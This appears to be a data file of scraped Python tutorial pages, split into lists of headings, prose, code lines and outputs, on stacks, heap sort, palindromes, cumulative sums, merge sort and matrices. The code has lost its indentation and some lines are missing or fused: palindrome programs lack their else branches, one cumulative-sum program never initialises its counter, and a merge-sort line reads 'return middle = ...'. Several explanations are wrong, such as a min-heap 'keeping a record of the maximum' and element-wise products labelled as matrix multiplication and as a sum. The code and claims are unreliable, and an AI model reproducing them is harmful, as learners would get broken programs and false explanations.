'print(my_stack.get())', 'print(my_stack.get())', 'print(my_stack.get())', 'print(""\\nStack is Empty: "", my_stack.empty())']","[""['x', 'y', 'z']"", 'Elements poped from my_stack:', 'z', 'y', 'x', 'my_stack after elements are poped:', '[]', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/Stack.py"", line 21, in <module>', 'print(my_stack.pop())', 'IndexError: pop from empty list', 'Initial my_stack:', ""deque(['a', 'b', 'c'])"", 'Elements poped from my_stack:', 'c', 'b', 'a', 'my_stack after elements are poped:', 'deque([])', '0', 'Stack is Full:  False', 'Size of Stack:  3', 'Elements poped from the my_stack', 'z', 'y', 'x', 'Stack is Empty:  True']",[],"[""|||empty() - It returns true, it the stack is empty. The time complexity is O(1).|||size() - It returns the length of the stack. The time complexity is O(1).|||top() - This method returns an address of the last element of the stack. The time complexity is O(1).|||push(g) - This method adds the element 'g' at the end of the stack - The time complexity is O(1).|||pop() - This method removes the topmost element of the stack. The time complexity is O(1).||||||List|||dequeu|||LifeQueue||||||empty() - If queue empty, returns true; otherwise return false.|||maxsize() - This method is used to set the maximum number of elements allowed in the queue.|||get() - It returns and removes the element from the queue. Sometime. The queue can be empty; it waits until element is available.|||full() - It returns True if the queue is full. The queue is defined as maxsize = 0 by default. In this case, it will not return True.|||put(item) - It adds the element to the queue; if the queue is full, wait until space is available.|||put_nowait(item) - It adds the element into the queue without delaying.|||qsize() - It returns the size of the queue.|||""]"
130,['Heap Sort in Python'],"['The heap sort is quite the same as the selection sort, where we find the maximum element and put it at the end. It is based on a comparison sorting algorithm which works on Binary heap data structure. It is the best example of an efficient sorting algorithm.']","['https://www.javatpoint.com/palindrome-program-in-python', 'https://www.javatpoint.com/stack-in-python', 'https://www.javatpoint.com/palindrome-program-in-python', 'https://www.javatpoint.com/stack-in-python', 'https://www.javatpoint.com/palindrome-program-in-python']",['https://static.javatpoint.com/python/images/heap-sort-in-python.png'],[],"['What is Heap Sort?', 'Heap Data Structure', 'Implementation', 'Sorting Custom Objects', 'Comparison between Heap sort and Other Algorithm', 'Conclusion']",[],[],"[""Let's understand it by the following example -"", 'The heap data structure is a complete binary tree that fulfills the heap property. It is also known as the binary heap.', 'A complete binary tree satisfies the following properties.', 'The first element of the heap can delete after restoring it. It takes O(log N) time, and that is highly effective.', 'Python provides the in-built functions for sorting elements using heap sort. The functions are given below.', 'Consider the following example for heap sort.', 'Explanation', 'We called the Heapsort Heapsort () function and passed a list. It returned the sorted list. ', 'As we can see, our implementation depends upon the built-in methods. Python provides the following methods.', ""Let's understand the following implementation of custom objects."", 'We have sorted the objects on the year base.', 'The heap sort algorithm takes O(nlogn) time in both average and worst-case scenarios while the quick sort is 20% faster in the average case.', 'Now we compare to the Merge sort, which takes the same time as the heap sort.', ""Merge sort is much stable and intuitively parallelizable, where heap sort doesn't have such advantages."", 'Furthermore, Merge sort is faster than the Heap Sort in most cases since they have the same time complexity.', 'In contrast, HeapsortHeapsort can be implemented much quickly in-place than Marge sort can.', 'It can be quickly implemented using Python. We require to insert the elements in a heap and take them out.']","[""It is an in-place algorithm, which means a fixed amount of memory is used to store the sorted list, or the memory size doesn't rely on the size of the preliminary list."", 'We have a custom class Student with properties age and name, and several objects of that class in an array, including a student called ""Thomas"" ages ""20"" and also ""Peter,"" have aged 20 appear in the same order.', 'If we sort the array of people by age, then there is no guarantee that ""Thomas"" would appear before the ""Peter"" in the sorted array. It can be defined order, but there is no guarantee.', 'As we can see in the above image of the heap, but it is not sorted. We will not dig in-depth this article because our focus is to explain the Heap sort algorithm, not a heap. In the heap sort, the next smallest element is always the first element.', 'The heap tree can be the two types - min-heap and max tree. A min-heap is kept a record of the maximum element. A max heap keeps track of the largest element. Heap mainly supports the following operations - delete_minimum(), get_minimum() and add().', 'Heap sort is useful for predefined data types, but it is more complicated to handle the user-define data types, such as class objects. We will sort the custom objects in this section.', ""One of the popular quick sort algorithms is also very efficient, but heap sort is legally used because of its reliability. The heap sort's key benefit is O(nlogn) upper bound as far as the time complexity is fretful."", 'The quick sort algorithm becomes slow in predictable situations. There is a chance of the security breach in quick sort since the foul O(n2) can be easily triggered.', 'Heapsort is not so popular and faster, but it is more predictable than any other sorting algorithm. This algorithm is preferred where memory and security are a priority.']","['Heap sort is an efficient and popular sorting algorithm. The heap sort concept is to ""eliminate"" the element from the heap part of the list one-by-one and insert them to the sorted part of the list. Before learning more about the heap sorting algorithm, let\'s discuss the heap data structure.', ""For example - We don't need the additional memory stack to store the sorted array and neither recursive call stack. The heapsort algorithm usually implements using the second array to sort the fixed values. This process is quick, simple, natural and easy to implement."", ""On the other hand, heap sort is unstable, which means it doesn't maintain the comparative order of elements with equal values. It can quickly sort primitive types such as integers and characters, but it has a problem with the complex types and objects."", 'In the above code, we have imported the heapq module which consist heappop() and heappush() method. We created the Heapsort Heapsort () method, which takes list1 as an argument. A for loop iterated the list1 and pushed the elements to the empty heap. We used the while loop and sorted element added to the empty sort.']","['from heapq import heappop, heappush', 'def heapsort(list1):', 'heap = []', 'for ele in list1:', 'heappush(heap, ele)', 'sort = []', '# the elements are lift in the heap', 'while heap:', 'sort.append(heappop(heap))', 'return sort', 'list1 = [27, 21, 55, 15, 60, 4, 11, 17, 2, 87]', 'print(heapsort(list1))', 'from heapq import heappop, heappush', 'class Car:', 'def __init__(self, model, year):', 'self.model = model', 'self.year = year', 'def __str__(self):', 'return str.format(""Model Name: {}, Year: {}"", self.model, self.year)', 'def __lt__(self, other):', 'return self.year < other.year', 'def __gt__(self, other):', 'return other.__lt__(self)', 'def __eq__(self, other):', 'return self.year == other.year', 'def __ne__(self, other):', 'return not self.__eq__(other)', 'def heapsort(list1):', 'heap = []', 'for element in list1:', 'heappush(heap, element)', 'ordered = []', 'while heap:', 'ordered.append(heappop(heap))', 'return ordered', 'car1 = Car(""Renault"", 2001)', 'car2 = Car(""Bentley"", 2005)', 'car3 = Car(""Kia"", 2014)', 'car4 = Car(""Maruti Suzuki"", 1999);', 'car5 = Car(""Nano"", 2012)', 'list1 = [car1, car2, car3, car4, car5]', 'for c in Heapsort Heapsort (list1):', 'print(c)']","['[2, 4, 11, 15, 17, 21, 27, 55, 60, 87]', 'Model Name: Maruti Suzuki, Year: 1999', 'Model Name: Renault, Year: 2001', 'Model Name: Bentley, Year: 2005', 'Model Name: Nano, Year: 2012', 'Model Name: Kia, Year: 2014']",[],"['|||Every level should be filled.|||All the nodes are as far left as possible.||||||heappush(list, item) -It is used to add the heap element and re-sort it.|||heappop(list) - It is used to remove the element and return the element.|||heapfy() - It is used to turn the given list into a heap.||||||heapq.nlargest(*n*, *iterable*, *key = None) - This method is used to get a list with the n largest element from the dataset, defined by the iterable.|||heapq.nsmallest(*n*, *iterable*, *key = None) - This method is used to get a list with the n smallest elements from the dataset, which is defined by the iterable.|||']"
131,['Palindrome program in python language'],['A palindrome is a number or letter that remains the same even if the number and letters are inverted.'],"['https://www.javatpoint.com/program-of-cumulative-sum-in-python', 'https://www.javatpoint.com/heap-sort-in-python', 'https://www.javatpoint.com/program-of-cumulative-sum-in-python', 'https://www.javatpoint.com/heap-sort-in-python', 'https://www.javatpoint.com/program-of-cumulative-sum-in-python']",[],[],['What is a palindrome?'],"['For example:', 'Palindrome algorithm', 'Palindrome Program']",[],"['121, 11, 414, 1221, 74747 are the palindrome numbers.', 'MOM, DAD, MADAM, REFER are the palindrome letters.', 'JAVATPOINT, PROGRAM, JAVA are not the palindrome letters.', 'Program 1: Palindrome string', 'Program 2: Palindrome string program', 'Program 3: Palindrome number program using while loop']",[],[],"[""str = 'JaVaJ'"", 'str = str.casefold()', '# This string is reverse.', 'rev = reversed(str)', 'if list(str) == list(rev):', 'print(""PALINDROME !"")', 'print(""NOT PALINDROME !"")', 'string=input((""Enter a letter:""))', 'if(string==string[::-1]):', 'print(""The letter is a palindrome"")', 'print(""The letter is not a palindrome"")', 'Num = int(input(""Enter a value:""))', 'Temp = num', 'Rev = 0', 'while(num > 0):', 'dig = num % 10', 'rev = rev * 10 + dig', 'num = num // 10', 'if(temp == rev):', 'print(""This value is a palindrome number!"")', 'print(""This value is not a palindrome number!"")']","['PALINDROME !', 'Enter a letter: javatpoint', 'The letter is not a palindrome', 'Enter a letter: MADAM', 'The letter is a palindrome', 'Enter the value: 2551', 'This value is not a palindrome number!', 'Enter the value: 1221', 'This value is a palindrome number!']",[],"['|||Read the number or letter.|||Hold the letter or number in a temporary variable.|||Reverse the letter or number.|||Compare the temporary variable with reverses letter or number.|||If both letters or numbers are the same, print ""this string/number is a palindrome.""|||Else print, ""this string/number is not a palindrome.""|||']"
132,['Program of Cumulative sum in python'],"['The cumulative sum means ""how much so far"". The definition of the cumulative sum is the sum of a given sequence that is increasing or getting bigger with more additions. The real example of a cumulative sum is the increasing amount of water in a swing pool.']","['https://www.javatpoint.com/merge-sort-in-python', 'https://www.javatpoint.com/palindrome-program-in-python', 'https://www.javatpoint.com/merge-sort-in-python', 'https://www.javatpoint.com/palindrome-program-in-python', 'https://www.javatpoint.com/merge-sort-in-python']",[],[],[],"['What is the cumulative sum?', 'Program: 1', 'Program: 2', 'Program 3: User define program']",[],[],[],[],"['Input: 10, 15, 20, 25, 30', 'Output: 10, 25, 45, 70, 100', 'Input: 1, 2, 3, 4, 5 6, 7 ,8, 9, 10', 'Output: 1, 3, 6, 10, 15, 21, 28, 36, 45, 55', '# Cumulative sum', 'def Cumulative_sum(lists):', 'cum_list = []', 'length = len(lists)', 'cum_list = [sum(lists[0:x:1]) for x in range(0, length+1)]', 'return cum_list[1:]', 'lists = [10, 15, 20, 25, 30]', 'print (Cumulative_sum(lists))', 'list=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]', 'cum_list=[]', 'for x in range(0,len(list)):', 'y+=list[x]', 'cum_list.append(y)', 'print(cum_list)', 'n = int(input(""enter the no of elements in list:""))', 'for x in range(0,n):', 'element=int(input(""enter the element"" + str(x+1) + "":""))', 'i.append(element)', 'j=[sum(i[0:x+1]) for x in range(0,len(i))]', 'print(""Original list is: "",i)', 'print(""Cumulative sum list is: "",j)']","['10, 25, 45, 70, 100', '1, 3, 6, 10, 15, 21, 28, 36, 45, 55', 'enter the no of elements in list: 10', 'enter the element1: 2', 'enter the element2: 3', 'enter the element3: 8', 'enter the element4: 6', 'enter the element5: 45', 'enter the element6: 32', 'enter the element7: 56', 'enter the element8: 32', 'enter the element9: 14', 'enter the element10: 25', 'Original list is: [2, 3, 8, 6, 45, 32, 56, 32, 14, 25]', 'Cumulative sum list is: [2, 5, 13, 19, 64, 96, 152, 184, 198, 223]']",[],[]
133,['Merge Sort in Python'],['Merge sort is similar to the quick sort algorithm as works on the concept of divide and conquer. It is one of the most popular and efficient sorting algorithm. It is the best example for divide and conquer category of algorithms.'],"['https://www.javatpoint.com/python-matrix', 'https://www.javatpoint.com/program-of-cumulative-sum-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-matrix', 'https://www.javatpoint.com/program-of-cumulative-sum-in-python', 'https://www.javatpoint.com/python-matrix']",[],[],"['Merge Sort Concept', 'Implementation', 'Sorting Custom Objects', 'Optimization', 'Conclusion']","['Sorting Array', 'Python Program', 'Python Program']",[],"[""Let's see the following Merge sort diagram."", ""We have divided the given list in the two halves. The list couldn't be divided in equal parts it doesn't matter at all."", 'The bottom-up approach provides the more optimization which we will define later.', ""The main part of the algorithm is that how we combine the two sorted sublists. Let's merge the two sorted merge list. "", 'Now we look at the next pair of elements 2 and 3. 2 is smaller so we add it into our sorted list and move forward to the list.', 'Continue this process and we end up with the sorted list of {1, 2, 3, 4, 7, 8, 11}. There can be two special cases.', ""Let's understand the above procedure by following steps."", ""Let's implement the merge sort in Python program."", ""Let's understand the following example.""]","['It divides the given list in the two halves, calls itself for the two halves and then merges the two sorted halves. We define the merge() function used to merging two halves.', 'Merge sort can be implement using the two ways - top-down approach and bottom-up approach. We use the top down approach in the above example, which is Merge sort most often used.', ""First, we observe the first element of both lists. We find the B's first element is smaller, so we add this in our sorted list and move forward in the B list."", 'We should remember that we can sort the element in the any order. We sort the given list in ascending order but we can easily sort in descending order.', ""The main concept of algorithm is to divide (sub)list into halves and sort them recursively. We continue the process until we end up lists that have only one element. Let's understand the following function for division -"", 'Our primary focus to divide the list into subparts before the sorting happen. We need to get the integer value so we use the // operator for our indices.', 'We can also sort the custom objects by using the Python class. This algorithm is almost similar to the above but we need to make it more versatile and pass the comparison function.', 'We will create a custom class, Car and add a few fields to it. We make few changes in the below algorithm to make it more versatile. We can do this by using the lambda functions.', 'The given list is [10, 4, 2, 12, 1, 3], instead of breaking it down into [10], [4], [2], [12], [1], [3] - we divides into the sublists which may already sorted: [10, 4], [2], [1, 12], [3] and now are ready to sort them.', 'Merge sort is inefficient algorithm in both time and space for the smaller sublists. So insertion sort is more efficient algorithm than the merge sort for the smaller sublists.', ""Merge sort is popular and efficient algorithm. It is more efficient algorithm for the large lists. It doesn't depend on the any unfortunate decisions that lead to bad runtimes."", 'We have discussed the merge sort concept in brief and implement it both on simple integer list and on custom objects via a lambda function used for comparison.']","['The sub lists are divided again and again into halves until we get the only one element each. Then we combine the pair of one element lists into two element lists, sorting them in the process. The sorted two element pairs is merged into the four element lists, and so on until we get the sorted list.', ""The merge sort algorithm is implemented by suing the top-down approach. It can be look slightly difficult, so we will elaborate each step in details. Here, we will implement this algorithm on two types of collections - integer element's list (typically used to introduce sorting) and a custom objects (a more practical and realistic scenario)."", ""We can improve the performance of the merge sort algorithm. First let's understand the difference between the top-down and bottom-up merge sort. The bottom-up approach sorts the elements of adjacent lists iteratively where the top-down approach breaks down the lists into the two halves."", 'There is one major demerit in the merge sort. It uses the additional memory that is used to store the temporary copies of lists before merging them. However Merge sort is widely used in the software. Its performance is fast and produces the excellent result.']","['def merge_sort(array, left_index, right_index):', 'if left_index >= right_index:', 'return middle = (left_index + right_index)//2', 'merge_sort(array, left_index, middle)', 'merge_sort(array, middle + 1, right_index)', 'merge(array, left_index, right_index, middle)', '# funtion to divide the lists in the two sublists', 'def merge_sort(list1, left_index, right_index):', 'if left_index >= right_index:', 'return', 'middle = (left_index + right_index)//2', 'merge_sort(list1, left_index, middle)', 'merge_sort(list1, middle + 1, right_index)', 'merge(list1, left_index, right_index, middle)', '# Defining a function for merge the list', 'def merge(list1, left_index, right_index, middle):', '# Creating subparts of a lists', 'left_sublist = list1[left_index:middle + 1]', 'right_sublist = list1[middle+1:right_index+1]', '# Initial values for variables that we use to keep', '# track of where we are in each list1', 'left_sublist_index = 0', 'right_sublist_index = 0', 'sorted_index = left_index', '# traverse both copies until we get run out one element', 'while left_sublist_index < len(left_sublist) and right_sublist_index < len(right_sublist):', '# If our left_sublist has the smaller element, put it in the sorted', '# part and then move forward in left_sublist (by increasing the pointer)', 'if left_sublist[left_sublist_index] <= right_sublist[right_sublist_index]:', 'list1[sorted_index] = left_sublist[left_sublist_index]', 'left_sublist_index = left_sublist_index + 1', '# Otherwise add it into the right sublist', 'else:', 'list1[sorted_index] = right_sublist[right_sublist_index]', 'right_sublist_index = right_sublist_index + 1', '# move forward in the sorted part', 'sorted_index = sorted_index + 1', '# we will go through the remaining elements and add them', 'while left_sublist_index < len(left_sublist):', 'list1[sorted_index] = left_sublist[left_sublist_index]', 'left_sublist_index = left_sublist_index + 1', 'sorted_index = sorted_index + 1', 'while right_sublist_index < len(right_sublist):', 'list1[sorted_index] = right_sublist[right_sublist_index]', 'right_sublist_index = right_sublist_index + 1', 'sorted_index = sorted_index + 1', 'list1 = [44, 65, 2, 3, 58, 14, 57, 23, 10, 1, 7, 74, 48]', 'merge_sort(list1, 0, len(list1) -1)', 'print(list1)', 'class Car:', 'def __init__(self, make, model, year):', 'self.make = make', 'self.model = model', 'self.year = year', 'def __str__(self):', 'return str.format(""Make: {}, Model: {}, Year: {}"", self.make, self.model, self.year)', 'def merge(list1, l, r, m, comp_fun):', 'left_copy = list1[l:m + 1]', 'r_sublist = list1[m+1:r+1]', 'left_copy_index = 0', 'r_sublist_index = 0', 'sorted_index = l', 'while left_copy_index < len(left_copy) and r_sublist_index < len(r_sublist):', '# We use the comp_fun instead of a simple comparison operator', 'if comp_fun(left_copy[left_copy_index], r_sublist[r_sublist_index]):', 'list1[sorted_index] = left_copy[left_copy_index]', 'left_copy_index = left_copy_index + 1', 'else:', 'list1[sorted_index] = r_sublist[r_sublist_index]', 'r_sublist_index = r_sublist_index + 1', 'sorted_index = sorted_index + 1', 'while left_copy_index < len(left_copy):', 'list1[sorted_index] = left_copy[left_copy_index]', 'left_copy_index = left_copy_index + 1', 'sorted_index = sorted_index + 1', 'while r_sublist_index < len(r_sublist):', 'list1[sorted_index] = r_sublist[r_sublist_index]', 'r_sublist_index = r_sublist_index + 1', 'sorted_index = sorted_index + 1', 'def merge_sort(list1, l, r, comp_fun):', 'if l >= r:', 'return', 'm = (l + r)//2', 'merge_sort(list1, l, m, comp_fun)', 'merge_sort(list1, m + 1, r, comp_fun)', 'merge(list1, l, r, m, comp_fun)', 'car1 = Car(""Renault"", ""33 Duster"", 2001)', 'car2 = Car(""Maruti"", ""Maruti Suzuki Dzire"", 2015)', 'car3 = Car(""Tata motor"", ""Jaguar"", 2004)', 'car4 = Car(""Cadillac"", ""Seville Sedan"", 1995)', 'list1 = [car1, car2, car3, car4]', 'merge_sort(list1, 0, len(list1) -1, lambda carA, carB: carA.year < carB.year)', 'print(""Cars sorted by year:"")', 'for car in list1:', 'print(car)', 'print()', 'merge_sort(list1, 0, len(list1) -1, lambda carA, carB: carA.make < carB.make)', 'print(""Cars sorted by make:"")', 'for car in list1:', 'print(car)']","['[1, 2, 3, 7, 10, 14, 23, 44, 48, 57, 58, 65, 74]', 'Cars sorted by year:', 'Make: Cadillac, Model: Seville Sedan, Year: 1995', 'Make: Renault, Model: 33 Duster, Year: 2001', 'Make: Tata motor, Model: Jaguar, Year: 2004', 'Make: Maruti, Model: Maruti Suzuki Dzire, Year: 2015', 'Cars sorted by make:', 'Make: Cadillac, Model: Seville Sedan, Year: 1995', 'Make: Maruti, Model: Maruti Suzuki Dzire, Year: 2015', 'Make: Renualt, Model: 33 Duster, Year: 2001', 'Make: Tata motor, Model: Jaguar, Year: 2004']",[],"['|||A : [2, 4, 7, 8]|||B : [1, 3, 11]|||sorted : empty||||||A : [2, 4, 7, 8]|||B : [1, 3, 11]|||Sorted : 1||||||A : [2, 4, 7, 8]|||B : [1, 3, 11]|||Sorted : 1||||||What if both sublists have same elements - In such case, we can move either one sublist and add the element to the sorted list. Technically, we can move forward in both sublist and add the elements to the sorted list.|||We have no element left in one sublist. When we run out the in a sublist simply add the element of the second one after the other.||||||First step is to create copies of lists. The first list contains the lists from [left_index,...,middle] and the second from [middle+1,?,right_index].|||We traverse both copies of list by using the pointer, select the smaller value of the two values and add them to the sorted list. Once we add the element to the list and we move forward in the sorted list regardless.|||Add the remaining elements in the other copy to the sorted array.|||']"
134,['Python Matrix'],"['In this article, we will introduce the Matrix with Python. We will implement each operation of matrix using the Python code.']","['https://www.javatpoint.com/python-unit-testing', 'https://www.javatpoint.com/merge-sort-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-array', 'https://www.javatpoint.com/python-unit-testing', 'https://www.javatpoint.com/merge-sort-in-python', 'https://www.javatpoint.com/python-unit-testing']",[],[],"['Working of Matrices', 'Creating a Matrix in Python', 'Read the Matrix Data', 'Adding two Matrices', 'Multiplication of Two Matrices', 'Transpose of Matrix', 'Transpose Matrix Using List Comprehension', 'Take Matrix Input from the User', 'Creating Matrix Using Numpy Library', 'Matrix Operation Using Numpy', 'Conclusion']","['Introduction', 'Read the Last Element from each row', 'Matrix Addition', 'Matrix Multiplication', 'Slicing of a Matrix', 'Example - Print first row and all columns', 'Example - Print rows of the matrix']",[],"['We will learn the following operations which are applied to the matrices.', 'The below matrix is 2x2, which means it has two rows and two columns.', 'In the following example, we will read each row of the defined matrix.', 'In the following example, we will read the last element of the each row using the Python program.', 'Explanation -', 'In the above code, we have created a matrix, and we get the length of the matrix. We iterated each row using for loop and printed the result.', 'We can read any row or column using the above method.', ""Let's understand the following operation of the matrix."", 'We will add the two matrices and using the nested for loop through the given matrices.', 'Explanation -', ""A transpose is an operation where the given matrix's row is converted into a column and vice-versa. Let's understand the following example."", 'Explanation', ""We can use the list comprehension to transpose a matrix with one line of code. Let's understand the following example."", 'The output is the same as above. The list comprehension reduced the lines of code and transposed the matrix.', 'Explanation -', 'Using the Numpy and map() function', 'The Numpy library helps us to work with the array. To work with the Numpy, we need to install the Numpy using the following command.', 'After a successful installation, we have to import it into our program.', ""Let's understand the following example."", 'We can perform all matrix operation using the numpy.array() such as addition, subtraction, transpose, slicing the matrix, etc.', ""We will create two matrices using the numpy.array() function and add them using the + operator. Let's understand the following example."", 'Now, we will implement slicing on matrix. To perform the slicing on matrix, follow the below syntax.', 'Mat1[row_start:row_end, col_start:col_end]', 'In the above syntax -', 'We will perform slicing in the below matrix.', 'Explanation']","[""We can create matrix in Python using the nested list. All elements are enclosed with the square brackets ([]) and separated by the comma. Let's see the following examples."", ""Multiplication of the two matrices is the same as the above code, and only we need to change the operator + to *. Let's understand the following example."", 'In the above code, we have two for loop to iterate through each row and each column. As we can see that in above output, we assigned the mat1[i][j] and res[j][k].', 'We have discussed the pre-defined matrices so far. But what if user wants to enter their data. So we are defining the following example of a user-defined matrix.', 'Python provides the external library Numpy. It is used for scientific computation; we will learn Numpy with matrix in below section. We will use it for the user input matrix.', ""We will use the mumpy.dot() method to multiply both matrices. It is a dot multiplication of the matrix mat1 and mat2 and handles the 2D array and performs multiplication. Let's understand the following example."", ""We can slice the matrix's element as we do in the Python standard list. Slicing returns the element based on the start/end index. We can also the negative slicing. The syntax is given below."", ""The above matrix consists of four rows. The 0th raw has [4, 10, 60, 18, 20], 1st row has [35, 16, 19, -12, 41] and so on. It has five columns. Let's understand the following example."", 'In the above example, we have printed the first and second rows, and we sliced the first, second, and third columns. According to the slicing syntax, we can get any rows and columns.']","[""A matrix is a rectangular 2-dimensional array which stores the data in rows and columns. The matrix can store any data type such as number, strings, expressions, etc. We must be familiar with the basic concepts of matrix before using it. The data is arranged in horizontal called rows, and vertical arrangements are columns. The number of elements inside a matrix is (R) X (C), where R is rows and C, columns. Python doesn't have a built-in type for matrices so that we will use the multiple lists as matrices."", 'In the above code, we have taken the input from the user to enter number of rows and columns. We have entered the 3 rows and 3 columns; it means the matrix will have 9 elements. In for loop, the elements are inserted to the empty matrix using the append () function. The second for is loop used to print input data in the matrix format.', 'The arr represents the matrix name. By default the start index is 0, for example - [:3], it means start index is 0. If we do not provide the value to end, it will consider the length of the array. We can pass negative index values to both start and end. In the following example, we will apply slicing in normal array to understand how slicing works.', ""We have discussed basic matrix using Python so far. We have learned to create matrix using a different approaches. Python matrix is a specialized two-dimensional rectangular list of data. The matrix can consist of a number, strings, expression, symbols, etc. Python doesn't provide a direct way to implement the matrix data type. We can create the matrix using the nested list and Numpy library.""]","['[[2,4],', ""matrix = [[ 'Arun',  25, 90, 74],"", '[""Sachin"", 410, 87.50, 130]', '[56, ""Abhinay"", 253, 471]', ""matrix = [[ 'Arun',  25, 90, 74],"", ""['Sachin', 410, 87.50, 130],"", ""[56, 'Abhinay', 253, 471]]"", 'print(""The matrix is: "", matrix)', ""The matrix is:  [['Arun', 25, 90, 74], ['Sachin', 410, 87.5, 130], [56, 'Abhinay', 253, 471]]"", ""matrix = [[ 'Arun',  25, 90, 74],"", ""['Sachin', 410, 87.50, 130],"", ""[56, 'Abhinay', 253, 471]]"", 'matrix_length = len(matrix)', '#To read the last element from each row.', 'for i in range(matrix_length):', 'print(matrix[i][-1])', 'mat1 = [[10, 13, 44],', '[11, 2, 3],', '[5, 3, 1]]', 'mat2 = [[7, 16, -6],', '[9, 20, -4],', '[-1, 3 , 27]]', 'mat3  = [[0,0,0],', '[0,0,0],', '[0,0,0]]', 'matrix_length = len(mat1)', '#To Add mat1 and mat2 matrices', 'for i in range(len(mat1)):', 'for k in range(len(mat2)):', 'mat3[i][k] = mat1[i][k] + mat2[i][k]', '#To Print the matrix', 'print(""The sum of Matrix mat1 and mat2 = "", mat3)', 'mat1 = [[10, 13, 44],', '[11, 2, 3],', '[5, 3, 1]]', 'mat2 = [[7, 16, -6],', '[9, 20, -4],', '[-1, 3 , 27]]', 'mat3  = [[0,0,0],', '[0,0,0],', '[0,0,0]]', 'matrix_length = len(mat1)', '#To Add mat1 and mat2 matrices', 'for i in range(len(mat1)):', 'for k in range(len(mat2)):', 'mat3[i][k] = mat1[i][k]  * mat2[i][k]', '#To Print the matrix', 'print(""The sum of Matrix mat1 and mat2 = "", mat3)', '# Program to transpose a matrix using a nested loop', 'mat1 = [[12,7],', '[4 ,5],', '[3 ,8]]', 'res = [[0,0,0],', '[0,0,0]]', '# iterate through rows', 'for i in range(len(mat1)):', '# iterate through columns', 'for j in range(len(mat1[0])):', 'res[j][i] = mat1[i][j]', 'for r in res:', 'print(r)', 'mat1 = [[12,7],', '[4 ,5],', '[3 ,8]]', 'res = [[0,0,0],', '[0,0,0]]', 'res = [[mat1[j][i] for j in range(len(mat1))] for i in range(len(mat1[0]))]', 'for r in res:', 'print(r)', '# A example for matrix input from user', 'row = int(input(""Enter the number of rows:""))', 'column = int(input(""Enter the number of columns:""))', '# Initialize empty matrix', 'matrix = []', 'print(""Enter the entries row wise:"")', '# For user input', 'for i in range(row):       # A outer for loop for row entries', 'a =[]', 'for j in range(column):     # A inner for loop for column entries', 'a.append(int(input()))', 'matrix.append(a)', '# For printing the matrix', 'for i in range(row):', 'for j in range(column):', 'print(matrix[i][j], end = "" "")', 'print()', 'pip install Numpy', 'import numpy as np', 'import numpy as np', 'mat1 = np.array([[10, -5, 15], [30, -6, 91], [2, 8, 7]])', 'print(""The matrix is: "")', 'print(mat1)', 'import numpy as np', 'mat1 = np.array([[7, 8, 9], [3, -1, 17], [15, 10, 21]])', 'mat2 = np.array([[9, -18, 27], [11, 22, 33], [13, -26, 39]])', 'mat3 = mat1 + mat2', 'print(""The matrix addition is: "")', 'print(mat3)', 'import numpy as np', 'mat1 = np.array([[4, 6], [5, 10]])', 'mat2 =  np.array([[3, -1], [11, 22]])', 'mat3 = mat1.dot(mat2)', 'print(""The matrix is:"")', 'print(mat3)', 'arr[start: end]', 'import numpy as np', 'arr = np.array([10,40,61,14,25,12,97])', 'print(arr[2:5]) # It will print the elements from 2 to 4', 'print(arr[:4]) # It will print the elements from 0 to 3', 'print(arr[3:]) # It will print the elements from 3 to length of the array.', 'mat1 = np.array([[4, 10, 60, 18, 20],', '[35, 16, 19, -12, 41],', '[23, 80, 42, 24, -20],', '[7, -10, 15, 40, 17]])', 'import numpy as np', 'mat1 = np.array([[4, 10, 60, 18, 20],', '[35, 16, 19, -12, 41],', '[23, 80, 42, 24, -20],', '[7, -10, 15, 40, 17]])', 'print(mat1[1:3, 1:4])', 'import numpy as np', 'mat1 = np.array([[4, 10, 60, 18, 20],', '[35, 16, 19, -12, 41],', '[23, 80, 42, 24, -20],', '[7, -10, 15, 40, 17]])', 'print(mat1[:1, ])', 'import numpy as np', 'mat1 = np.array([[14, 60, 29], [35, -10, 13], [4,8,12]])', 'print(mat1[0])  #first row', 'print(mat1[1]) # the second row', 'print(mat1[-1]) # -1 will print the last row']","['74', '130', '471', 'The sum of Matrix M1 and M2 =  [[17, 29, 38], [20, 22, -1], [4, 6, 28]]', 'The sum of Matrix mat1 and mat2 =  [[70, 208, -264], [99, 40, -12], [-5, 9, 27]]', '[12, 4, 3]', '[7, 5, 8]', '[12, 4, 3]', '[7, 5, 8]', 'Enter the number of rows:3', 'Enter the number of columns:3', 'Enter the entries row wise:', '5', '6', '7', '8', '9', '2', '4', '3', '1', '5 6 7', '8 9 2', '4 3 1', 'The matrix is:', '[[10 -5 15]', '[30 -6 91]', '[ 2  8  7]]', 'The matrix addition is:', '[[ 16 -10  36]', '[ 14  21  50]', '[ 28 -16  60]]', 'The matrix is:', '[[ 78 128]', '[125 215]]', '[61 14 25]', '[10 40 61 14]', '[14 25 12 97]', '[[ 16  19 -12]', '[ 80  42  24]]', '[ 4 10 60 18 20]]', '[14 60 29]', '[ 35 -10  13]', '[ 4  8 12]']",[],"['|||Matrix addition|||Matrix Subtraction|||Matrix Multiplication|||Scalar Product|||Cross Product|||Many other operations||||||We have created a 3x3 matrix using the nested list.|||The first row contains [\'Arun\', 25, 90, 74] in the list form.|||The second row contains [\'Sachin\', 410, 87.50, 130] in the list form.|||The third row contains [56, ""Abhinay"", 253, 471] in the list form.|||We notice that our matrix consists of numbers as well as a string value.||||||The first and second matrices are 3X3.|||We initialized another matrix mat3, which will store the resultant matrix.|||We applied nested for loop to iterate the matrices, the outer loop iterate on the first matrix.|||The control transfers the inner loop; and it iterated to the second inner loop, here the value of i is zero, and k is also zero.|||In the first iteration, the first element of the mat1 and mat2 added to each other will continue until all elements are added.||||||The first start/end represents the rows that mean select the rows of the matrix.|||The first start/end represents the columns that mean select the column of the matrix.|||']"
